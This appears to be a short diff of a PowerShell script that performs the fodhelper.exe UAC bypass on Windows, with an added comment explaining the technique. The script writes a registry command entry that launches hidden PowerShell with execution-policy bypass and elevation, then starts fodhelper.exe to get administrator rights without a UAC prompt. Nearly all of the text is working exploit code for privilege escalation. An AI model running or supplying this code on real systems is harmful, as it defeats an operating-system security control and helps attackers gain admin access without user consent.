@@ -3,3 +3,7 @@ New-Item -Path $regPath -Force
 Set-ItemProperty -Path $regPath -Name "DelegateExecute" -Value ""
 Set-ItemProperty -Path $regPath -Name "(default)" -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Sta -NonI -W Hidden -Exec Bypass -C Start-Process powershell -Verb runAs"
 Start-Process "C:\Windows\System32\fodhelper.exe"
+
+
+Creates a registry key to hijack fodhelper.exe (which runs as admin by default).
+When fodhelper.exe is executed, it launches PowerShell as admin without a UAC prompt.
